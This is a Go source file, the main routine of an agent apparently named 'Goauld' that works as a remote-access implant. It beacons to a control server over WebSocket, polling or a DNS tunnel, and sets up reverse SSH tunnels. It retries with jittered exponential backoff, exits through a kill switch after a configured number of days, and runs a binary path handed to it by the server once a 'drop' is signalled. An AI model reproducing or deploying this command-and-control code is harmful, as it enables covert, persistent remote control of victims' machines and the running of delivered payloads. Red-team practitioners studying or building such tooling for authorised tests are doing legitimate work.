//go:build mini

package main

import (
	globalcontext "Goauld/agent/context"
	"Goauld/agent/ssh/transport"
	"context"
	"fmt"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"time"

	"Goauld/agent/config"
	"Goauld/agent/control"
	"Goauld/common/log"

	"github.com/cenkalti/backoff/v5"
)

var globalCanceler *globalcontext.GlobalCanceler

type Path string

func main() {
	// Initialize the agent using the provided parameters (Command line, configuration file, environment variable)
	config.InitAgent()

	if len(config.Get().IgnoredArgs()) > 0 {
		log.Warn().Str("Args", strings.Join(config.Get().IgnoredArgs(), " / ")).Msg("ignored arguments")
	}

	killSwitchDuration := KillSwitchLoop(config.Get().GetKillSwitchDays())
	// Define an operation function that returns a value and an error.
	// The value can be any type.
	// We'll pass this operation to Retry function

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	operation := func() (any, error) {
		log.Info().Msg("Starting agent")

		cancelReason := run()
		if cancelReason.Status == globalcontext.Exit {
			log.Kill().Str("Reason", cancelReason.Msg).Msg("Agent stopped")
			cancel()
			//nolint:nilnil
			return nil, nil
		}
		if cancelReason.Status == globalcontext.Dropped {
			log.Info().Str("Path", cancelReason.Msg).Msg("Agent dropped")
			cancel()
			return Path(cancelReason.Msg), nil
		}
		log.Reset().Str("Reason", cancelReason.Msg).Msg("Agent restarting")

		return nil, fmt.Errorf("agent restarting: %s", cancelReason.Msg)
	}

	exp := &backoff.ExponentialBackOff{
		InitialInterval:     time.Second,
		RandomizationFactor: 2,
		Multiplier:          1.5,
		MaxInterval:         5 * time.Minute,
	}
	result, err := backoff.Retry(
		ctx,
		operation,
		backoff.WithBackOff(exp),
		backoff.WithMaxTries(config.Get().GetMexRetries()),
		backoff.WithMaxElapsedTime(killSwitchDuration),
		backoff.WithNotify(func(_ error, _ time.Duration) {

		}),
	)

	if p, ok := result.(Path); ok {
		result = nil
		err = Exec(p, config.Get())
	}
	if err != nil {
		log.Info().Err(err).Msg("Agent shut down")

		return
	}
	if result != nil {
		//nolint:forbidigo
		fmt.Println(result)
	}
}

func run() globalcontext.CancelReason {
	var dnsTransport *transport.DNSSH
	cancelReason := make(chan globalcontext.CancelReason)
	controlErr := make(chan error)

	// dropDone is a one time chan used to signal that the configuration exchange with the server is completed.
	// The signal is emitted by the socket.io handler, and the agent waits for it before starting component initialization
	// (sshd, ssh, socks, etc.)
	dropDone := make(chan string)
	log.Info().Msg("Agent init done")
	/*defer func() {
		close(cancelReason)
		close(dropDone)
		close(controlErr)
	}()*/

	ctx, cancel := context.WithCancel(context.Background())
	globalCanceler = &globalcontext.GlobalCanceler{
		Cancel:       cancel,
		CancelReason: cancelReason,
	}
	defer cancel()

	var controlPlanClient *control.ControlPlanClient
	var err error

	// Define the different strategies to initialize the control socket
	//  Currently, all strategies are tried in order.
	socketOrder := []string{
		"Websocket",
		"Upgrade",
		"Polling",
		"DNS",
	}
	controlInitStrategy := map[string]control.InitStrategy{
		"Websocket": {
			Name: "Websocket",
			InitFunc: func(client *control.ControlPlanClient, success chan<- struct{}, chanErr chan<- error) error {
				return client.InitWs(success, chanErr)
			},
		},
		"Upgrade": {
			Name: "Upgrade",
			InitFunc: func(client *control.ControlPlanClient, success chan<- struct{}, chanErr chan<- error) error {
				return client.InitWsUpgrade(success, chanErr)
			},
		},
		"Polling": {
			Name: "Polling",
			InitFunc: func(client *control.ControlPlanClient, success chan<- struct{}, chanErr chan<- error) error {
				return client.InitPolling(success, chanErr)
			},
		},
		"DNS": {
			Name: "DNS",
			InitFunc: func(client *control.ControlPlanClient, success chan<- struct{}, chanErr chan<- error) error {
				if dnsTransport == nil {
					dnsTransport, err = transport.NewDNSSH()
					if err != nil {
						return err
					}
				}

				err = client.InitOverDNS(dnsTransport.ControlStream, success, chanErr)
				if err != nil {
					return err
				}

				// As the  control socket is established using DNS we consider that the only working protocol is DNS
				// so we set the RSSH protocol order to only DNS
				config.Get().SetRSSHOrder([]string{"DNS"})

				return nil
			},
		},
	}

	if config.Get().UseRelay() {
		config.Get().SetRSSHOrder([]string{"ws"})

		config.Get().SetRelayServerAsTarget()
	}

	order := config.Get().GetRSSHOrder()
	if len(order) == 1 {
		if order[0] == "dns" {
			socketOrder = []string{"DNS"}
		}
		if order[0] == "http" {
			socketOrder = []string{"Polling"}
		}
		if order[0] == "ws" {
			socketOrder = []string{"Websocket"}
		}
	}

	success := false
	// We iterate over the different strategies to initialize the control socket
	// If the initialization is successful, we stop the loop
	for _, socket := range socketOrder {
		initializer, ok := controlInitStrategy[socket]
		if !ok {
			continue
		}
		log.Info().Str("ControlMode", initializer.Name).Msg("Trying to connect to the control socket")
		cpc, err := control.Init(ctx, globalCanceler, dropDone, controlErr, initializer.InitFunc)
		if err == nil {
			log.Info().Str("SocketMode", initializer.Name).Msg("Control plan started")
			success = true
			controlPlanClient = cpc

			break
		}
		log.Error().Err(err).Str("ControlMode", initializer.Name).Msg("error initializing the control plan")
	}

	// If no strategy was successful, we restart the agent
	if !success {
		return globalcontext.CancelReason{
			Status: globalcontext.Restart,
			Msg:    "unable to init the control plan",
		}
	}

	if dnsTransport != nil {
		defer func(dnsTransport *transport.DNSSH) {
			err := dnsTransport.Close()
			if err != nil {
				log.Debug().Err(err).Msg("error while closing dns transport")
			}
		}(dnsTransport)
	}

	cancelCtrlC := HandleCtrlC(controlPlanClient, globalCanceler)
	defer cancelCtrlC()

	// Wait for errors to occur and print them
	select {
	case err := <-controlErr:
		if err != nil {
			log.Error().Err(err).Msg("error starting the agent")
		}

	case <-ctx.Done():
		log.Error().Err(ctx.Err())
	case path := <-dropDone:
		return globalcontext.CancelReason{
			Status: globalcontext.Dropped,
			Msg:    path,
		}
	}
	reason := <-cancelReason

	return reason
}

// HandleCtrlC intercepts the ctrl-c events.
// It signals to close all running goroutines and wait one second to allow the agent to signal the disconnection
// to the server. Then it exits.
func HandleCtrlC(controlPlanClient *control.ControlPlanClient, canceler *globalcontext.GlobalCanceler) func() {
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt)
	go func() {
		for sig := range c {
			log.Info().Str("signal", sig.String()).Msg("received signal")
			log.Info().Msg("Shutting down control plan")
			canceler.Exit("ctrl-c signal received")
			controlPlanClient.Close()
		}
	}()

	return func() {
		signal.Stop(c)
	}
}

func KillSwitchLoop(days int) time.Duration {
	if days == 0 {
		return 0
	}
	d := time.Duration(days*24) * time.Hour
	go func() {
		log.Debug().Int("Days", days).Time("Kill Time", time.Now().Add(d)).Msg("Killing switch")
		t := time.NewTimer(d)
		defer t.Stop()
		<-t.C
		if globalCanceler != nil {
			globalCanceler.Exit("Kill switch activated")
		}
		time.Sleep(3 * time.Second)
		os.Exit(4)
	}()

	return d
}

func Exec(p Path, cfg *config.Agent) error {
	cmd := exec.Command(string(p))
	cmd.Env = append(os.Environ(), cfg.Env()...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	return cmd.Run()
}
